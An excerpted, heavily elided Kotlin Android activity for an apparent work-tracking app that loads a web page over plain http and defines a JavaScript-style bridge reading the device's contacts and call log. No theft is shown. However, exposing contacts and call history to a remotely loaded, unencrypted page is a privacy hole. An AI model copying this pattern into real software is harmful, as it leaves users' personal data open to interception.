...
class MainActivity : AppCompatActivity() {
    ...
    override fun onCreate(savedInstanceState: Bundle?) {
        ...
        val url = when (action) {
            ...
            "mark_done" -> { val workId = intent.getStringExtra("work_id"); "http://web.mitalinfosys.info/#/mark-done/$workId" }
    ...
    private fun checkPermissions() {
        ...
        if (neededPermissions.isNotEmpty()) { ActivityCompat.requestPermissions(this, neededPermissions.toTypedArray(), PERMISSIONS_REQUEST_CODE) }
    }
    ...
    inner class AndroidBridge {
        ...
        fun getContacts(): String {
            ...
            try {
                val cursor: Cursor? = contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, arrayOf(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER), null, null, ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC")
                cursor?.use {
                    ...
                    while (it.moveToNext() && count < 500) {
                        ...
                        contactsList.put(contact); count++
                    }
                }
            } catch (e: Exception) { android.util.Log.e("AndroidBridge", "Error: ${e.message}") }
        ...
        fun getCallLog(): String {
            ...
            try {
                val cursor: Cursor? = contentResolver.query(CallLog.Calls.CONTENT_URI, arrayOf(CallLog.Calls.CACHED_NAME, CallLog.Calls.NUMBER, CallLog.Calls.DATE, CallLog.Calls.TYPE), null, null, CallLog.Calls.DATE + " DESC")
                cursor?.use {
